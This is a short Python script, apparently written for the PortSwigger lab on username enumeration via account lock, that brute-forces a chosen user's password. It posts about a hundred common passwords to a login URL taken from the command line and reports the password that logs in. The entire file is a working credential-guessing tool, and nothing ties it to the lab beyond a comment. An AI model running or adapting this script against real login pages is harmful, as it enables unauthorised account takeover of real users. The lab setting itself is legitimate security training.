# -*- coding: utf-8 -*-
#
# Brute force script to exploit "Username enumeration via account lock" lab at
# "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

import sys
import requests


if len(sys.argv) != 3:
  print ("\nUsage: {} https://<lab_url>/login <victim_user>\n".format(sys.argv[0]))

else:

  # Required for color output
  RED   = "\033[1;91m"
  GREEN = "\033[1;92m"
  CYAN  = "\033[96m"
  RESET = "\033[0m"

  target      = sys.argv[1]
  victim_user = sys.argv[2]

  payloads = ("123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow")
  error1   = "Invalid username or password."
  error2   = "You have made too many incorrect login attempts. Please try again in 1 minute(s)."


  print ("\nBruteforcing the password for the user {}, please wait...\n".format(victim_user))

  for payload in payloads:

    data = { "username":victim_user, "password":payload }

    response = requests.post(target, data=data, allow_redirects=False)

    if error1 in response.text or error2 in response.text:
      print ("  Trying to login with credentials {}{}{}:{}{}{}\t{}Failed{}"
        .format(CYAN, victim_user, RESET, CYAN, payload, RESET, RED, RESET))

    else:

      if response.status_code != 200:
        print ("Operation aborted due the server responded with a {}{}{} status code.\n"
          .format(RED, response.status_code, RESET))

        break

      else:
        print ("  Trying to login with credentials {}{}{}:{}{}{}\t{}OK{}"
        .format(CYAN, victim_user, RESET, CYAN, payload, RESET, GREEN, RESET))

        print ("\nThe user {}{}{} has the password {}{}{}!\n"
          .format(GREEN, victim_user, RESET, GREEN, payload, RESET))

        break
